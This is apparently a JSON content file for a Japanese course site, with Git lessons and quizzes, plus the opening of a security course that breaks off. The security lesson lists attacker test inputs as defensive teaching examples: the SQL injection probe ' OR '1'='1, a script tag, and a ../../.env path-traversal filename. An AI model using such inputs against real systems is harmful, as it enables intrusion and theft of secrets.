17:36:26 +0000 5) - 牛乳（低脂肪）2 本\n```\n\n行ごとに、最後に変えたコミットが分かります。「この変な行はなぜある？」と思ったら、blame でコミットを見つけ、`git show` でそのときの変更とメッセージを読みます。GitHub の画面の「Blame」ボタンでも同じものが見られます。\n\n## .gitignore：コミットしないものを決める\n\n```text\n$ git status --short\n?? .env              ← 秘密情報のファイルが「新しいファイル」として見えている\n```\n\n`.gitignore` に名前を書くと、Git はそのファイルを **無いものとして扱います**。\n\n```gitignore\n# 秘密情報\n.env\n# Python の作業用の環境と、Python が自動で作るファイル\n.venv/\n__pycache__/\n# JavaScript のライブラリ（npm install で作り直せる）\nnode_modules/\n# .log で終わるファイル全部\n*.log\n```\n\n`#` で始まる行はコメントです。⚠️ `.env  # 秘密情報` のように **同じ行の後ろにコメントを書くと、そこまで含めてファイル名だと思われる** ので、コメントは別の行に書きます。\n\n```text\n$ echo \".env\" > .gitignore\n$ git status --short\n?? .gitignore        ← .env が一覧から消えた\n```\n\n⚠️ `.gitignore` は **これから** 追跡しないための設定です。すでにコミットしたファイルは消えません。秘密情報を一度でもコミットして push したら、AI と開発するコースの「秘密情報と環境変数」の手順で、**キーそのものを無効にして作り直す** 必要があります。\n\n⚠️ `git add .`（全部をステージに）は便利ですが、`.gitignore` が無いと `.env` まで入ってしまいます。実行前に `git status` を見る習慣をつけましょう。\n\n## よいコミットとは\n\n| | よい | よくない |\n|---|---|---|\n| 大きさ | 1 つの目的ごと（「パンを追加」） | 1 週間分を 1 回で（「いろいろ修正」） |\n| メッセージ | 何を・なぜが分かる（`Fix tax rounding for 8% items`） | `update`、`fix`、`aaa` |\n| 中身 | そのコミットだけで動く | 途中の壊れた状態 |\n\nコミットを小さく分けておくと、後で「この変更だけ取り消す」（レッスン 7）が簡単になります。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`git status --short` で `?? app.py` と表示された。意味は？",
        "choices": [
         "Git がまだ管理していない新しいファイル",
         "変更してステージに入れたファイル",
         "削除されたファイル"
        ],
        "answer": 0,
        "explain": "`??` は untracked（未追跡）。`git add app.py` でステージに入れると `A ` になります。"
       },
       {
        "question": "`git diff` に何も表示されないのに、`git status` では変更がある。考えられる理由は？",
        "choices": [
         "Git が壊れている",
         "変更をすでに `git add` でステージに入れている（`git diff --staged` で見える）",
         "ファイルが保存されていない"
        ],
        "answer": 1,
        "explain": "`git diff` はステージに入れる前の変更だけを表示します。ステージ済みの変更は `git diff --staged` で確認します。"
       },
       {
        "question": "`.env` をうっかりコミットして GitHub に push してしまった。正しい対応は？",
        "choices": [
         "`.gitignore` に `.env` を追加すれば、GitHub からも消えるので大丈夫",
         "次のコミットで `.env` を削除すれば、履歴からも消える",
         "中のキーやパスワードを無効にして新しいものを作り直す（そのうえで追跡をやめる）"
        ],
        "answer": 2,
        "explain": "一度 push すると履歴に残り、誰かに見られた可能性があります。まずキー自体を無効にするのが最優先です。"
       }
      ]
     ],
     "id": "03-commits-history"
    },
    {
     "title": "ブランチとマージ ― 作業の道を分けて合わせる",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "version_control",
      "tooling"
     ],
     "summary": "ブランチの正体（コミットを指す名札）、switch・merge、早送りマージとマージコミット、origin/main と fetch・pull の関係。",
     "body": "## このレッスンのゴール\n\n- ブランチが「コミットを指す名札」であることを説明できる\n- 早送り（fast-forward）マージとマージコミットの違いを、`git log --graph` で見分けられる\n- `origin/main`・`fetch`・`pull`・`push` の関係が分かる\n\n## ブランチ ＝ コミットを指す名札\n\n```text\nf60a6eb ← 3509968 ← d978c53 ← 0f626e2\n                                  ↑\n                                 main   ← HEAD（今ここにいる）\n```\n\nコミットは「1 つ前のコミット」を覚えていて、鎖のようにつながっています。**ブランチは、その鎖のどれか 1 つに貼った名札** にすぎません。\n新しくコミットすると、今いるブランチの名札が新しいコミットへ動きます。\n\n`HEAD` は「今どの名札を見ているか」の印です。\n\n## ブランチを作って移る\n\n```text\n$ git switch -c add-fruit\nSwitched to a new branch 'add-fruit'\n```\n\n| コマンド | 意味 |\n|---|---|\n| `git switch -c 名前` | 新しいブランチを作って移る |\n| `git switch 名前` | 既存のブランチに移る |\n| `git branch` | ブランチの一覧（`*` が今いるところ） |\n| `git branch -d 名前` | マージ済みのブランチを消す |\n\n古い記事や AI のコードでは `git checkout -b 名前` / `git checkout 名前` と書かれていることもあります。同じ意味です（`checkout` は役割が多すぎたので、`switch` と `restore` に分けられました）。\n\n⚠️ ブランチを移ると、**作業ディレクトリのファイルが、そのブランチの内容に書き換わります**。コミットしていない変更があると、移れないか、変更が一緒についてきます。移る前に `git status` を確認しましょう。\n\n## マージ：2 つの道を合わせる\n\n### ① 早送りマージ（fast-forward）\n\nmain がその後進んでいなければ、名札を前に進めるだけで済みます。\n\n```text\n$ git switch main\n$ git merge add-fruit\nUpdating 0f626e2..d539851\nFast-forward\n shopping.md | 1 +\n 1 file changed, 1 insertion(+)\n\n$ git log --oneline --graph\n* d539851 Add banana\n* 0f626e2 Ignore .env\n* d978c53 Add app\n```\n\n`Fast-forward` と出たら、新しいコミットは作られていません。履歴は 1 本のまっすぐな線のままです。\n\n### ② マージコミット\n\n両方のブランチが別々に進んでいたら、**2 つの親を持つ新しいコミット** を作って合わせます。\n\n```text\n$ git log --oneline --graph\n*   077e971 Merge branch 'price'\n|\\\n| * 2803c21 Low-fat milk           ← price ブランチでの変更\n* | 1552dfe Two bottles of milk    ← 同じころの main での変更\n|/\n* d539851 Add banana\n```\n\n| 記号 | 読み方 |\n|---|---|\n| `*` | コミット |\n| `\\|\\` | ここで道が 2 本に分かれている（上から見て合流） |\n| `\\|/` | ここから道が分かれた |\n\nこの例は、同じ行を両方で変えたので **コンフリクト** になりました（次のレッスン）。違う場所を変えていれば、Git が自動で合わせてくれます。\n\n## リモート：GitHub 側のリポジトリ\n\n```text\n自分のパソコン                                 GitHub（origin）\n  main  ──── git push ────────────────────→   main\n  origin/main ←─── git fetch ───────────────  main\n  main  ←─── git merge origin/main ─────\n          （fetch + merge = git pull）\n```\n\n| 用語 | 意味 |\n|---|---|\n| **origin** | GitHub など、クローン元のリポジトリにつける標準の名前 |\n| **origin/main** | 「最後に確認したときの、GitHub 側の main」の **写し**。自動では更新されない |\n| `git fetch` | GitHub の最新を取ってきて、`origin/main` を更新する。自分の main は変わらない |\n| `git pull` | `fetch` ＋ 自分のブランチへのマージ |\n| `git push` | 自分のコミットを GitHub に送る |\n\n`Your branch is behind 'origin/main' by 3 commits`（3 コミット遅れています）と出たら、`git pull` で追いつきます。\n\n### --ff-only：安全な pull\n\nこのリポジトリの `open-site.bat` には、こう書かれています。\n\n```bat\ngit pull --ff-only\nif errorlevel 1 (\n  echo Update failed. Opening the current version instead.\n)\n```\n\n`--ff-only` は「**早送りでできるときだけ** pull する」という指定です。手元で何か変えていて、マージコミットが必要になりそうなら、何もせずに失敗します。勝手にマージして状態をややこしくしないための、安全な書き方です。\n\n## AI のコードではこう出てくる\n\n```bash\ngit switch -c feature/login\n# …作業してコミット…\ngit push -u origin feature/login\n```\n\n`-u`（`--set-upstream`）は「このブランチは、GitHub の `feature/login` とつながっている」と覚えさせる指定です。2 回目からは `git push` だけで送れます。\nClaude がこのサイトを更新するときも、`claude/...` というブランチを作って push し、GitHub Actions が main にマージしています（次のレッスンのプルリクエストを省いた形）。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "ブランチの正体として正しいのは？",
        "choices": [
         "コミットをまるごとコピーしたもの",
         "あるコミットを指す名札（新しくコミットすると前に進む）",
         "GitHub にしか存在しないもの"
        ],
        "answer": 1,
        "explain": "ブランチはコミットを指しているだけなので、作るのも消すのも一瞬です。"
       },
       {
        "question": "`git merge` で `Fast-forward` と表示された。何が起きた？",
        "choices": [
         "合わせる先が進んでいなかったので、名札を前に進めただけ（マージコミットは無し）",
         "コンフリクトが起きた",
         "新しいマージコミットが作られた"
        ],
        "answer": 0,
        "explain": "早送りマージでは履歴は 1 本のまま。両方が進んでいた場合にだけ、マージコミットが作られます。"
       },
       {
        "question": "`git fetch` を実行した直後の状態として正しいのは？",
        "choices": [
         "自分の main が GitHub の main と同じになっている",
         "`origin/main` は最新になったが、自分の main はまだ変わっていない",
         "自分のコミットが GitHub に送られた"
        ],
        "answer": 1,
        "explain": "fetch は取ってくるだけ。自分のブランチに取り込むには merge（または最初から pull）が必要です。"
       }
      ]
     ],
     "id": "04-branches-merge"
    },
    {
     "title": "コンフリクトの直し方 ― <<<<<<< を怖がらない",
     "level": 3,
     "minutes": 16,
     "concepts": [
      "version_control",
      "reading"
     ],
     "summary": "同じ場所を両方で変えると起きるコンフリクト。マーカーの読み方、直してからコミットするまでの手順、やめたいときの戻り方。",
     "body": "## このレッスンのゴール\n\n- コンフリクトが起きる理由を説明できる\n- `<<<<<<<`・`=======`・`>>>>>>>` のマーカーを読み、正しく直せる\n- 直し終わるまでの手順と、やめたいときの `--abort` が分かる\n\n## コンフリクトとは\n\n2 つのブランチが **同じファイルの同じ場所** を、それぞれ違う内容に変えていると、Git はどちらを残せばよいか決められません。これが **コンフリクト（衝突）** です。\n違う場所の変更なら、Git が自動で合わせます。コンフリクトはエラーではなく、**「ここは人間が決めて」という相談** です。\n\n前のレッスンの続きで、実際に起こしてみます。\n\n```text\nmain  ブランチ：「- 牛乳」を「- 牛乳 2 本」に変えてコミット\nprice ブランチ：「- 牛乳」を「- 牛乳（低脂肪）」に変えてコミット\n```\n\n```text\n$ git merge price\nAuto-merging shopping.md\nCONFLICT (content): Merge conflict in shopping.md\nAutomatic merge failed; fix conflicts and then commit the result.\n```\n\n「shopping.md の中身でコンフリクト。自動のマージに失敗したので、直してからコミットして」と言っています。\n\n## 状態を確認する\n\n```text\n$ git status\nOn branch main\nYou have unmerged paths.\n  (fix conflicts and run \"git commit\")\n  (use \"git merge --abort\" to abort the merge)\n\nUnmerged paths:\n  (use \"git add <file>...\" to mark resolution)\n\tboth modified:   shopping.md\n```\n\n| 表示 | 意味 |\n|---|---|\n| `You have unmerged paths` | マージの途中で止まっている |\n| `both modified: shopping.md` | 両方のブランチが変えたファイル。ここを直す |\n| `git merge --abort` | マージをやめて、始める前に戻る |\n\n## マーカーを読む\n\n```text\n# 買い物メモ\n\n- りんご\n- バナナ\n<<<<<<< HEAD\n- 牛乳 2 本\n=======\n- 牛乳（低脂肪）\n>>>>>>> price\n- パン\n```\n\n| 部分 | 意味 |\n|---|---|\n| `<<<<<<< HEAD` から `=======` まで | **今いるブランチ**（main）の内容 |\n| `=======` から `>>>>>>> price` まで | **取り込もうとしたブランチ**（price）の内容 |\n| マーカーの外 | 自動で合わせられた部分（そのままでよい） |\n\n## 直す\n\n選択肢は 3 つです。\n\n| 方針 | 結果 |\n|---|---|\n| 自分（HEAD）の方を残す | `- 牛乳 2 本` |\n| 相手（price）の方を残す | `- 牛乳（低脂肪）` |\n| **両方の意図を合わせる** | `- 牛乳（低脂肪）2 本` |\n\n今回は「2 本」も「低脂肪」もどちらも必要なので、合わせます。**マーカーの 3 行（`<<<<<<<`・`=======`・`>>>>>>>`）も必ず消します**。\n\n```text\n# 買い物メモ\n\n- りんご\n- バナナ\n- 牛乳（低脂肪）2 本\n- パン\n```\n\n## 仕上げ：add して commit\n\n```bash\ngit add shopping.md      # 「直しました」という印\ngit commit --no-edit     # マージコミットを作る（メッセージは自動の Merge branch 'price'）\n```\n\n```text\n$ git log --oneline --graph\n*   077e971 Merge branch 'price'\n|\\\n| * 2803c21 Low-fat milk\n* | 1552dfe Two bottles of milk\n|/\n* d539851 Add banana\n```\n\nここまで、実際に実行して確認した流れです。\n\n## 直すときのコツ\n\n- **どちらが正しいかは、コードの意味で決める**。片方を機械的に選ぶと、相手の修正が消えます\n- 直した後に **テストを実行する**、またはアプリを動かして確かめる。文字としては合っていても、動きが壊れていることがあります\n- 消し忘れたマーカーがないか探す：`grep -rn \"<<<<<<<\" .`\n- VS Code では、コンフリクトの上に「Accept Current Change（今の方）」「Accept Incoming Change（来た方）」「Accept Both Changes（両方）」のボタンが出ます。**Both は単に並べるだけ** なので、今回のように 1 行にまとめたいときは手で直します\n- 分からなくなったら `git merge --abort` で、マージ前に戻ってやり直せます\n\n## よくある場面\n\n| 場面 | 起きること |\n|---|---|\n| `git pull` したら CONFLICT | 自分の変更と、GitHub 側の他人（や別のパソコン）の変更がぶつかった。直し方は同じ |\n| GitHub のプルリクエストに「This branch has conflicts」 | main が先に進んで、同じ場所が変わった。手元で main をマージして直し、push する |\n| `package-lock.json` などの自動生成ファイルでコンフリクト | 手で直さず、片方を採用してから `npm install` で作り直すのが定番 |\n| `git rebase` の途中で CONFLICT | 直して `git add` した後、`git rebase --continue`。やめるなら `git rebase --abort` |\n\nこのリポジトリでは、Claude が push したブランチを GitHub Actions が自動で main にマージしています。もしここでコンフリクトが起きると自動マージは失敗するので、Claude に知らせて相談してもらう約束になっています。\n\n## AI に直してもらうとき\n\nコンフリクトの解消は AI に任せることもできますが、**「両方のブランチで何をしようとしていたか」** を伝えないと、片方の変更を黙って消すことがあります。\n直してもらった後は、`git diff HEAD~1` などで **マージ前と比べて、両方の変更が残っているか** を確認しましょう。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`<<<<<<< HEAD` と `=======` の間に書かれているのは？",
        "choices": [
         "今いるブランチ（マージを実行した側）の内容",
         "取り込もうとしたブランチの内容",
         "Git が自動で作った正解"
        ],
        "answer": 0,
        "explain": "HEAD は今いるブランチです。`=======` から `>>>>>>>` までが、取り込もうとしたブランチの内容です。"
       },
       {
        "question": "コンフリクトを直した後、マージを完了させる手順は？",
        "choices": [
         "そのまま `git push` する",
         "マーカーを消して内容を直し、`git add` してから `git commit` する",
         "`git merge --abort` を実行する"
        ],
        "answer": 1,
        "explain": "`git add` で「このファイルは直した」と Git に伝え、`git commit` でマージコミットを作ります。`--abort` はマージをやめるコマンドです。"
       },
       {
        "question": "「どう直せばよいか分からなくなった。マージを始める前に戻りたい」ときは？",
        "choices": [
         "ファイルを全部削除する",
         "`git push --force` する",
         "`git merge --abort` を実行する"
        ],
        "answer": 2,
        "explain": "マージの途中なら、`--abort` でマージを始める前の状態に戻れます。"
       }
      ]
     ],
     "id": "05-conflicts"
    },
    {
     "title": "プルリクエストとレビュー",
     "level": 3,
     "minutes": 16,
     "concepts": [
      "version_control",
      "ai_coding",
      "testing"
     ],
     "summary": "「この変更を main に入れていい？」の提案と確認の場、プルリクエスト（PR）。作り方、画面の読み方、レビューで見ること、3 種類のマージ方法。",
     "body": "## このレッスンのゴール\n\n- プルリクエストの流れ（ブランチ → push → PR → レビュー → マージ）を説明できる\n- PR の画面（Files changed・Checks・Conversation）で何を見ればよいか分かる\n- マージの 3 つの方法（Merge・Squash・Rebase）の違いが分かる\n\n## プルリクエストとは\n\n**プルリクエスト（PR）** は、「このブランチの変更を main に取り込んでください」という **提案** です。GitHub 上で、変更の中身を見ながら話し合い、OK になったらマージします。\nGitLab では **マージリクエスト（MR）** と呼びますが、同じものです。\n\n```text\n① ブランチを作って作業・コミット（レッスン 4）\n② git push -u origin ブランチ名\n③ GitHub で PR を作る（タイトルと説明を書く）\n④ 自動テスト（CI）が走る ＋ 人がレビューする\n⑤ 指摘があれば、同じブランチに追加でコミットして push（PR に自動で反映）\n⑥ OK になったら「Merge」ボタン → main に入る\n⑦ ブランチを消す\n```\n\nAI のエージェント（Claude Code など）に作業を任せるときも、**PR にしてもらってから、自分で確認してマージする** のが安全な進め方です（AI と開発するコースの「エージェントに任せるときの進め方」）。\n\n## PR の作り方\n\npush すると、GitHub の画面に「Compare & pull request」ボタンが出ます。コマンドで作るなら GitHub CLI（`gh`）を使います。\n\n```bash\ngh pr create --title \"Add banana to shopping list\" --body \"バナナが売り切れていたので次回用に追加\"\ngh pr list                 # PR の一覧\ngh pr view 12              # 12 番の PR の内容\ngh pr checkout 12          # 12 番の PR のブランチを手元に持ってきて試す\ngh pr merge 12 --squash    # 12 番を Squash でマージ\n```\n\n### よい PR の説明\n\n| 書くこと | 例 |\n|---|---|\n| 何を変えたか | 税込み価格の計算を `Decimal` に変更 |\n| なぜ変えたか | 8% の商品で 1 円ずれる不具合があったため（Issue #34） |\n| どう確かめたか | 単体テストを追加。198 円 × 3 個 = 641 円になることを確認 |\n| 見てほしいところ | 端数の切り捨て・四捨五入の方針がこれでよいか |\n\n## PR の画面の読み方\n\n| タブ | 何がある | 見ること |\n|---|---|---|\n| **Conversation** | 説明・コメント・レビューの結果・マージボタン | 何のための変更か。未解決の指摘が残っていないか |\n| **Commits** | この PR に含まれるコミットの一覧 | 関係ない変更が混ざっていないか |\n| **Checks** | 自動テスト（GitHub Actions など）の結果 | ✅ 緑なら合格、❌ 赤なら失敗。赤のままマージしない |\n| **Files changed** | 変更の差分（レッスン 3 の diff） | ここが本体。1 行ずつ読む |\n\nFiles changed では、行番号の横の **「+」を押すとその行にコメント** が付けられます。最後に「Review changes」から次のどれかを選びます。\n\n| 選択 | 意味 |\n|---|---|\n| **Comment** | 感想・質問だけ |\n| **Approve** | OK。マージしてよい |\n| **Request changes** | 直してほしいところがある。直るまでマージしない |\n\n## レビューで見ること\n\nAI と開発するコースの「差分を読む」のチェックリストに、PR ならではの点を足すと次のようになります。\n\n| 観点 | 質問 |\n|---|---|\n| 目的 | 説明に書いてあることと、差分が一致しているか。**頼んでいない変更** が混ざっていないか |\n| 大きさ | 大きすぎないか（目安：数百行を超えたら分けてもらう） |\n| テスト | 変更に合わせてテストが追加・更新されているか。Checks は緑か |\n| 秘密情報 | `.env`、API キー、パスワードが入っていないか |\n| 消えたもの | 削除された行（赤）に、必要な処理が含まれていないか |\n| 依存関係 | `requirements.txt`・`package.json` に知らないライブラリが増えていないか（セキュリティのコース） |\n\nAI が作った PR は、説明が立派でも **実際の差分と一致しているとは限りません**。説明ではなく、Files changed を基準に確認しましょう。\n\n## マージの 3 つの方法\n\n| ボタン | 何が起きるか | 履歴 |\n|---|---|---|\n| **Create a merge commit** | マージコミットを作る（レッスン 4 の ②） | ブランチのコミットがすべて残り、分かれて合流する形 |\n| **Squash and merge** | PR のコミットを **1 つにまとめて** main に入れる | main は 1 PR ＝ 1 コミットの、まっすぐな履歴 |\n| **Rebase and merge** | PR のコミットを、main の先頭に 1 つずつ付け直す | まっすぐな履歴。コミットは個別に残る |\n\n「修正」「typo」「やっぱり戻す」のような細かいコミットがたくさんある PR は、**Squash** にすると main の履歴が読みやすくなります。どれを使うかはチームで決めておきます。\n\n## このリポジトリの場合\n\nこのサイトでは、利用者の了承のもとで **PR を省略** しています。\n\n```yaml\non:\n  push:\n    branches: [\"claude/**\"]     # claude/ で始まるブランチに push されたら\n...\n      git merge --no-edit \"origin/${GITHUB_REF_NAME}\"   # main にマージして\n      git push origin main                               # main を push する\n```\n\n`.github/workflows/auto-merge-claude.yml` の一部です。学習用の自分だけのサイトなので、毎回の確認の手間を省いています。\nチームの開発や、お金・個人情報を扱うアプリでは、このような自動マージではなく、**PR で人が確認してからマージする** のが基本です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "プルリクエストを作った後で修正を頼まれた。どうすれば PR に反映される？",
        "choices": [
         "新しい PR を作り直す",
         "同じブランチに修正をコミットして push する",
         "main に直接 push する"
        ],
        "answer": 1,
        "explain": "PR はブランチにひもづいているので、同じブランチに push すれば自動で反映されます。"
       },
       {
        "question": "AI が作った PR のレビューで、いちばん信用してよい情報は？",
        "choices": [
         "PR の説明文",
         "コミットメッセージ",
         "Files changed の実際の差分"
        ],
        "answer": 2,
        "explain": "説明やメッセージは間違っていることがあります。実際に何が変わったかは差分にしか書かれていません。"
       },
       {
        "question": "「typo 修正」「やり直し」など細かいコミットが 15 個ある PR を、main の履歴を 1 つにまとめて取り込みたい。選ぶのは？",
        "choices": [
         "Create a merge commit",
         "Squash and merge",
         "Rebase and merge"
        ],
        "answer": 1,
        "explain": "Squash は PR のコミットを 1 つにまとめます。main の履歴が「1 PR ＝ 1 コミット」になって読みやすくなります。"
       }
      ]
     ],
     "id": "06-pull-requests"
    },
    {
     "title": "取り消しとやり直し ― restore・revert・reset・stash・reflog",
     "level": 4,
     "minutes": 20,
     "concepts": [
      "version_control",
      "tooling",
      "security"
     ],
     "summary": "「元に戻したい」の場面ごとに使うコマンドが違う。消えるもの・残るものを表で整理し、最後の救命ボート reflog まで。",
     "body": "## このレッスンのゴール\n\n- 「どこまで戻したいか」に合わせて、restore・revert・reset を選べる\n- `reset --soft`・`--mixed`・`--hard` の違いと、`--hard` で何が消えるかを説明できる\n- 作業を一時退避する `stash` と、消したはずのコミットを探す `reflog` が分かる\n\nここでのコマンドと出力は、すべて買い物メモのリポジトリで実際に試したものです。\n\n## まず全体の地図\n\n| やりたいこと | コマンド | 消えるもの |\n|---|---|---|\n| ファイルの編集を、最後のコミットの状態に戻す | `git restore ファイル` | **そのファイルのコミットしていない変更** |\n| ステージに入れたのを取り消す（編集は残す） | `git restore --staged ファイル` | 無し |\n| 直前のコミットのメッセージ・中身を直す | `git commit --amend` | 直前のコミット（作り直される） |\n| push 済みのコミットを打ち消す | `git revert コミット` | 無し（打ち消すコミットが **増える**） |\n| コミットを無かったことにする | `git reset` | オプション次第（下の表） |\n| 作業を一時的にどける | `git stash` | 無し（あとで戻せる） |\n| 消えたコミットを探す | `git reflog` | 無し |\n\n## restore：コミットしていない変更を戻す\n\n```bash\necho \"- 卵\" >> shopping.md     # 編集した\ngit restore shopping.md        # 最後のコミットの状態に戻る（- 卵 は消える）\n```\n\n```bash\ngit add shopping.md            # ステージに入れてしまった\ngit restore --staged shopping.md\ngit status --short\n#  M shopping.md               ← ステージからは外れたが、編集は残っている\n```\n\n⚠️ `--staged` を付けない `git restore` は、**コミットしていない編集を消します**。Git の記録にない変更なので、戻せません。\n\n## commit --amend：直前のコミットを直す\n\n```bash\ngit commit -am \"Add eggs\"\ngit commit --amend -m \"Add eggs to the list\"   # メッセージを直した\n```\n\n```text\n$ git log --oneline -2\n2b32853 Add eggs to the list\n077e971 Merge branch 'price'\n```\n\n`--amend` は、直前のコミットを **作り直します**（ID も変わる）。\n⚠️ **push した後に amend すると**、GitHub 側の履歴と食い違い、`git push --force` が必要になります。push 済みなら、次の revert を使います。\n\n## revert：打ち消すコミットを足す\n\n```text\n$ git revert --no-edit HEAD\n[main 0932c7a] Revert \"Add eggs to the list\"\n\n$ git log --oneline -3\n0932c7a Revert \"Add eggs to the list\"     ← 「卵を消す」という新しいコミット\n2b32853 Add eggs to the list              ← 元のコミットは残っている\n077e971 Merge branch 'price'\n```\n\nrevert は、**指定したコミットと逆の変更をする新しいコミット** を作ります。履歴は消さずに増やすだけなので、**他の人と共有している（push 済みの）ブランチでも安全** です。\n「本番で不具合が出たので、昨日の変更を取り消したい」ときの定番です。\n\n## reset：名札を過去に戻す\n\n`git reset` は、ブランチの名札（レッスン 4）を **過去のコミットに動かします**。その後ろのコミットは、ブランチから見えなくなります。\nオプションで、作業中のファイルをどうするかが変わります。\n\n| オプション | ブランチの名札 | ステージ | 作業ディレクトリのファイル | 使う場面 |\n|---|---|---|---|---|\n| `--soft` | 戻る | **変更が残る**（ステージに入った状態） | 残る | コミットをまとめ直したい |\n| `--mixed`（省略時） | 戻る | 空になる | **残る** | コミットをやり直したい |\n| `--hard` | 戻る | 空になる | **消える（コミット時の状態に戻る）** | 全部捨てて戻りたい |\n\n```text\n$ git reset --soft HEAD~1\n$ git status --short\nM  shopping.md             ← コミットは消えたが、変更はステージに残っている\n\n$ git reset --hard HEAD~1\nHEAD is now at 077e971 Merge branch 'price'   ← ファイルもその時点に戻った\n```\n\n⚠️ `--hard` は、**コミットしていない変更を完全に消します**。AI と開発するコースで「取り消せない系」として紹介したのはこのためです。\n⚠️ push 済みのコミットを reset で消して `git push --force` すると、他の人の手元の履歴と食い違います。共有ブランチでは revert を使います。\n\n## stash：作業を一時的にどける\n\n「作業の途中だけど、急いで main に移って別の修正をしたい」ときに使います。\n\n```text\n$ git stash\nSaved working directory and index state WIP on main: 077e971 Merge branch 'price'\n\n$ git status --short\n                           ← 何も無い（変更がどけられた）\n\n$ git stash list\nstash@{0}: WIP on main: 077e971 Merge branch 'price'\n\n$ git stash pop            ← どけた変更を戻す（stash からは消える）\n```\n\n⚠️ stash は便利ですが、**溜め込むと何がどこにあるか分からなくなります**。長く置いておくなら、ブランチを作ってコミットしたほうが安全です。\n\n## reflog：最後の救命ボート\n\nreset で消したはずのコミットも、実はしばらく Git の中に残っています。**HEAD が動いた記録** を見るのが `git reflog` です。\n\n```text\n$ git reflog -5\n077e971 HEAD@{0}: reset: moving to HEAD~1\n2b32853 HEAD@{1}: reset: moving to HEAD~1\n0932c7a HEAD@{2}: revert: Revert \"Add eggs to the list\"\n2b32853 HEAD@{3}: commit (amend): Add eggs to the list\n0735572 HEAD@{4}: commit: Add eggs\n\n$ git reset --hard HEAD@{2}\nHEAD is now at 0932c7a Revert \"Add eggs to the list\"   ← reset する前に戻れた\n```\n\n`reset --hard` で「コミットを消してしまった！」と思っても、**コミットしてあったものなら、reflog から戻せます**。\n戻せないのは、**一度もコミットしていない変更** だけです。だから「こまめにコミット」が最大の保険になります。\n\n## AI が提案してきたら\n\n| 提案 | 確認すること |\n|---|---|\n| `git reset --hard` | コミットしていない変更は無いか（`git status`）。必要なら先に commit か stash |\n| `git push --force` | そのブランチを他の人も使っていないか。`--force-with-lease`（他人の変更があれば止まる）にできないか |\n| `git clean -fd` | Git が管理していないファイル（`.env` など）まで消える。先に `git clean -nd` で消えるものを確認 |\n| `git checkout .` / `git restore .` | すべてのファイルのコミットしていない変更が消える |\n| `git revert` | ✅ 履歴を壊さない。共有ブランチではこちらが基本 |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "GitHub に push 済みの「昨日のコミット」を取り消したい。チームのブランチなので履歴は書き換えたくない。使うのは？",
        "choices": [
         "`git reset --hard HEAD~1` して `git push --force`",
         "`git revert コミットID`",
         "`git commit --amend`"
        ],
        "answer": 1,
        "explain": "revert は、打ち消す新しいコミットを足すだけなので、共有している履歴を壊しません。"
       },
       {
        "question": "`git reset --hard HEAD~1` を実行した。消えて二度と戻せない可能性があるのは？",
        "choices": [
         "1 つ前のコミット",
         "一度もコミットしていなかった編集",
         "GitHub 上の main ブランチ"
        ],
        "answer": 1,
        "explain": "コミットは reflog から戻せることが多いですが、コミットしていない編集は Git の記録に無いので戻せません。"
       },
       {
        "question": "`git reset --soft HEAD~1` の後の状態は？",
        "choices": [
         "コミットも変更も全部消える",
         "何も変わらない",
         "直前のコミットは取り消されるが、その変更はステージに残っている"
        ],
        "answer": 2,
        "explain": "`--soft` は名札を戻すだけで、変更はステージに置いたままにします。コミットをまとめ直したいときに使います。"
       }
      ]
     ],
     "id": "07-undo"
    }
   ],
   "status": "open"
  },
  {
   "title": "セキュリティの基本",
   "icon": "🔐",
   "order": 130,
   "category": "topic",
   "description": "AI のコードで見落としがちな危険を、実際に攻撃を再現しながら理解する。考え方の基本、パスワード、SQL インジェクション、XSS、ログインとセッションの落とし穴、ライブラリとサプライチェーン、最後に総合演習。",
   "levels": {
    "1": "入門：攻撃者の目線",
    "2": "基礎：代表的な攻撃",
    "3": "実践：見落としやすいところ",
    "4": "応用：総合演習"
   },
   "id": "130-security",
   "lessons": [
    {
     "title": "セキュリティの考え方 ― 「外から来たものは信じない」",
     "level": 1,
     "minutes": 14,
     "concepts": [
      "security",
      "reading"
     ],
     "summary": "攻撃者の目線、信頼の境界線、守るべき 3 つのもの（秘密・正しさ・使えること）、最小権限と多層防御。このコースで何度も使う「ものさし」。",
     "body": "## このレッスンのゴール\n\n- 「信頼の境界線」の意味を説明し、コードの中で外から来るデータを見つけられる\n- 守るべき 3 つのもの（機密性・完全性・可用性）を、例で説明できる\n- 最小権限・多層防御という考え方を知り、AI のコードの判断に使える\n\n## 攻撃者は「想定外の使い方」をする\n\n普通の利用者は、名前の欄に名前を、数量の欄に 1〜10 くらいの数を入れます。攻撃者はそうしません。\n\n| 入力欄 | 普通の人 | 攻撃者が試すこと |\n|---|---|---|\n| 名前 | `Ryo` | `' OR '1'='1`（レッスン 3）、`<script>...</script>`（レッスン 4） |\n| 数量 | `2` | `-100`、`99999999999`、`2.5`、`\"abc\"` |\n| URL の ID | `/orders/15` | `/orders/16`（他人の注文、バックエンドコースの IDOR） |\n| ファイル | `photo.jpg` | 中身がプログラムの `photo.jpg`、10GB のファイル、`../../.env` という名前 |\n| ログイン | 正しいパスワードを 1 回 | よくあるパスワードを 1 秒に何千回 |\n\n**セキュリティとは、「想定外の使い方をされても、困ったことにならない」ようにすること** です。\n\n## 信頼の境界線\n\nプログラムの中で、**自分がコントロールしていないところから来るデータ** は、すべて攻撃者が自由に作れると考えます。\n\n```text\n         信頼できない（外）          │        信頼できる（中）\n                                    │\n  ブラウザから送られる値 ─────────→ │ → チェック → 自分のサーバーのコード\n  URL・フォーム・JSON・Cookie       │                    ↓\n  アップロードされたファイル         │               データベース\n  他社の API の返事                  │\n  AI（LLM）の出力                    │\n```\n\n| 「外」から来るもの | 例 |\n|---|---|\n| リクエストのすべて | URL・クエリ・フォーム・JSON の本文・ヘッダー・Cookie |\n| ブラウザ側のチェック | JavaScript の入力チェックは **飛ばせる**（直接リクエストを送ればよい） |\n| ファイル名・ファイルの中身 | 拡張子は名札にすぎない（コンピュータの基礎コース） |\n| 外部の API・Web ページ | 改ざん・乗っ取りの可能性 |\n| **LLM の出力** | 入力に紛れ込んだ命令に従ってしまうことがある（プロンプトインジェクション） |\n\n⚠️ 特に大事なのは 